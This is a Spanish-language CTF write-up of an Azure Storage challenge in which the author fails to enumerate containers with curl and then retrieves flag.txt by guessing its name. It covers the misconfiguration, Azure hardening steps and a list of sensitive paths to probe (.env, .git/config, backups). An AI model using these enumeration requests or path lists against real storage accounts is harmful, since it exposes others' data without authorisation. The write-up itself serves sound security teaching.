# CTF Writeup: MediCloudX Labs Portal

## Información del Reto

- **Nombre**: MediCloudX Labs Portal
- **Puntos**: 379
- **Categoría**: Cloud Security / Azure
- **URL**: https://ctf25sac672da51.z13.web.core.windows.net/

## Descripción

MediCloudX Labs ha lanzado su nuevo portal de información pública para pacientes. La empresa afirma que su infraestructura en la nube es completamente segura y que han implementado las mejores prácticas de AZURE.

## Flag

```
CLD[b8c4d0f3-5g9e-5b2c-ad4f-8g3b6e9c7f5d]
```

## Solución

### 1. Reconocimiento Inicial

Al analizar la URL proporcionada, identifiqué que es un sitio web estático alojado en Azure Storage Account:

```
https://ctf25sac672da51.z13.web.core.windows.net/
```

Información clave extraída:
- **Nombre del Storage Account**: `ctf25sac672da51`
- **Región/Zone**: `z13` (indica la región de Azure)
- **Tipo**: Azure Static Website Hosting

### 2. Análisis del Sitio Web

Accedí al sitio web y encontré un portal de laboratorio de innovación médica con:
- Página institucional sobre investigación y desarrollo
- Servicios de IA médica y APIs
- Estadísticas del laboratorio
- Sin funcionalidad interactiva aparente

```bash
curl -s https://ctf25sac672da51.z13.web.core.windows.net/
```

El sitio muestra solo contenido estático HTML/CSS, similar al reto anterior.

### 3. Intento de Enumeración del Storage Account

#### Intentos Realizados

**Intento 1**: Listar contenedores del storage account
```bash
curl -s "https://ctf25sac672da51.blob.core.windows.net/?comp=list"
```

**Resultado**: `ResourceNotFound` - No tenemos permisos para listar contenedores.

**Intento 2**: Enumerar archivos del contenedor `$web`
```bash
curl -s "https://ctf25sac672da51.blob.core.windows.net/\$web?restype=container&comp=list"
```

**Resultado**: `ResourceNotFound` - No se puede enumerar el contenido del contenedor.

### 4. Acceso Directo a Archivos Conocidos

Aunque la enumeración falló, probé acceder directamente a archivos comunes que típicamente contienen información sensible:

#### Archivos Probados

**flag.txt via Blob Storage endpoint**:
```bash
curl -s https://ctf25sac672da51.blob.core.windows.net/\$web/flag.txt
```
Resultado: `ResourceNotFound`

**flag.txt via Static Website endpoint**:
```bash
curl -s https://ctf25sac672da51.z13.web.core.windows.net/flag.txt
```

**Resultado**: ¡ÉXITO!
```
CLD[b8c4d0f3-5g9e-5b2c-ad4f-8g3b6e9c7f5d]
```

**robots.txt**:
```bash
curl -s https://ctf25sac672da51.z13.web.core.windows.net/robots.txt
```
Resultado: `404 WebContentNotFound`

### 5. Obtención de la Flag

La flag se obtuvo accediendo directamente al archivo a través del website endpoint:

```bash
curl -s https://ctf25sac672da51.z13.web.core.windows.net/flag.txt
```

**Output**:
```
CLD[b8c4d0f3-5g9e-5b2c-ad4f-8g3b6e9c7f5d]
```

## Vulnerabilidad Técnica

### Descripción

**Azure Storage Account con acceso público de lectura a blobs individuales**

A diferencia del reto de AWS donde se podía enumerar todo el bucket, en este caso:

1. **La enumeración del contenedor está bloqueada**: No se puede listar el contenido del contenedor `$web`
2. **Los archivos individuales son accesibles públicamente**: Si conoces el nombre del archivo, puedes acceder a él
3. **Security by Obscurity**: Se confía en que nadie adivinará los nombres de archivos

### Configuración del Storage Account

El storage account probablemente tiene esta configuración:

**Public Access Level**: `Blob` (en lugar de `Container`)

- **Container**: Permite lectura anónima del contenedor completo y sus blobs
- **Blob**: Permite lectura anónima de blobs individuales solamente (configuración del reto)
- **Private**: Sin acceso anónimo

### Diferencias entre AWS S3 y Azure Storage

| Aspecto | AWS S3 (Reto anterior) | Azure Storage (Este reto) |
|---------|------------------------|---------------------------|
| Enumeración | ✅ Permitida (`ListBucket`) | ❌ Bloqueada |
| Lectura de objetos | ✅ Permitida (`GetObject`) | ✅ Permitida (si conoces el nombre) |
| Nivel de exposición | Alto (descubrimiento fácil) | Medio (requiere adivinar nombres) |
| Seguridad | Muy mala | Mala (security by obscurity) |

### Impacto

- **Exposición de archivos sensibles**: Aunque no se puede enumerar, archivos con nombres predecibles están expuestos
- **Security by Obscurity**: Confiar en nombres "secretos" no es una medida de seguridad válida
- **Fuga de datos**: Archivos como `flag.txt`, `backup.zip`, `config.json`, etc., pueden ser descubiertos

## Mejores Prácticas de Seguridad para Azure

### Configuración Correcta para Azure Static Website

1. **Deshabilitar acceso público anónimo**:
   ```bash
   az storage account update \
     --name <storage-account> \
     --resource-group <resource-group> \
     --allow-blob-public-access false
   ```

2. **Usar Azure CDN con autenticación**:
   ```
   Usuario → Azure CDN → Storage Account (privado)
   ```

3. **Implementar Azure Front Door**:
   - Control de acceso granular
   - WAF (Web Application Firewall)
   - Protección DDoS

4. **Usar SAS Tokens para acceso temporal**:
   ```bash
   az storage blob generate-sas \
     --account-name <account> \
     --container-name $web \
     --name file.txt \
     --permissions r \
     --expiry 2025-12-31T23:59:59Z
   ```

5. **Configurar RBAC (Role-Based Access Control)**:
   - Usar Azure AD para autenticación
   - Asignar roles específicos en lugar de acceso público
   - Implementar Managed Identities

6. **Separar contenido público y privado**:
   - Diferentes storage accounts para diferentes niveles de sensibilidad
   - Nunca mezclar datos públicos con archivos sensibles

### Herramientas de Auditoría

1. **Azure Security Center**:
   ```bash
   # Revisar recomendaciones de seguridad
   az security assessment list
   ```

2. **Azure Policy**:
   ```json
   {
     "if": {
       "allOf": [
         {
           "field": "type",
           "equals": "Microsoft.Storage/storageAccounts"
         },
         {
           "field": "Microsoft.Storage/storageAccounts/allowBlobPublicAccess",
           "equals": "true"
         }
       ]
     },
     "then": {
       "effect": "deny"
     }
   }
   ```

3. **Azure Storage Explorer**:
   - Revisar visualmente permisos de contenedores
   - Validar niveles de acceso público

## Herramientas Utilizadas

- `curl` - Cliente HTTP para peticiones web
- Conocimiento de Azure Storage endpoints
- Prueba de archivos comunes (flag.txt, robots.txt)

## Comandos de Explotación Resumidos

```bash
# 1. Intentar enumerar contenedores (bloqueado en este caso)
curl "https://ctf25sac672da51.blob.core.windows.net/?comp=list"

# 2. Intentar enumerar el contenedor $web (bloqueado)
curl "https://ctf25sac672da51.blob.core.windows.net/\$web?restype=container&comp=list"

# 3. Acceder directamente a archivos conocidos
curl https://ctf25sac672da51.z13.web.core.windows.net/flag.txt

# Con Azure CLI (si estuviera disponible)
az storage blob list \
  --account-name ctf25sac672da51 \
  --container-name '$web' \
  --output table

az storage blob download \
  --account-name ctf25sac672da51 \
  --container-name '$web' \
  --name flag.txt \
  --file flag.txt
```

## Archivos Comunes a Probar en CTF

Cuando encuentras un Azure Static Website, prueba estos archivos:

```bash
# Archivos de configuración
/.env
/web.config
/appsettings.json
/config.json

# Archivos de backup
/backup.zip
/backup.tar.gz
/site.zip
/db.sql

# Archivos del CTF
/flag.txt
/flag
/secret.txt

# Archivos de control de versiones
/.git/config
/.git/HEAD

# Archivos de robots y sitemap
/robots.txt
/sitemap.xml

# Archivos de aplicaciones
/app-debug.apk
/debug.apk
/package.json
```

## Lecciones Aprendidas

1. **Security by Obscurity no funciona**:
   - Aunque la enumeración esté bloqueada, los nombres predecibles pueden ser adivinados
   - Archivos con nombres obvios como `flag.txt`, `backup.zip`, etc., son fáciles de descubrir

2. **Diferencia entre endpoints**:
   - **Blob Storage Endpoint**: `https://<account>.blob.core.windows.net/`
   - **Static Website Endpoint**: `https://<account>.z##.web.core.windows.net/`
   - Ambos pueden tener diferentes niveles de acceso

3. **Niveles de acceso público en Azure**:
   - `Private`: Sin acceso anónimo (recomendado)
   - `Blob`: Acceso anónimo solo a blobs (inseguro si hay datos sensibles)
   - `Container`: Acceso anónimo completo (muy inseguro)

4. **Validación de configuraciones**:
   - Siempre revisar permisos antes del deployment
   - Usar Azure Policy para prevenir configuraciones inseguras
   - Implementar CI/CD con validaciones de seguridad

5. **Nunca almacenar información sensible en storage público**:
   - Usar Azure Key Vault para secretos
   - Implementar autenticación adecuada
   - Separar datos por nivel de sensibilidad

## Comparación con Reto AWS

| Característica | AWS S3 (MediCloudX Public) | Azure Storage (MediCloudX Labs) |
|----------------|----------------------------|---------------------------------|
| Enumeración | ✅ Posible | ❌ Bloqueada |
| Lectura de archivos | ✅ Directa | ✅ Si conoces el nombre |
| Dificultad | Baja (listado visible) | Baja-Media (adivinar nombres) |
| Archivos encontrados | 3 (index.html, flag.txt, app-debug.apk) | flag.txt (otros no probados) |
| Vulnerabilidad principal | Permisos públicos de List+Read | Permisos públicos de Read + nombres predecibles |

## Referencias

- [Azure Storage Security Guide](https://docs.microsoft.com/en-us/azure/storage/common/storage-security-guide)
- [Azure Static Website Hosting](https://docs.microsoft.com/en-us/azure/storage/blobs/storage-blob-static-website)
- [Azure RBAC Documentation](https://docs.microsoft.com/en-us/azure/role-based-access-control/)
- [OWASP Cloud Security](https://owasp.org/www-project-cloud-security/)

---

**Fecha de resolución**: 21 de noviembre de 2025
**Autor**: CTF Team
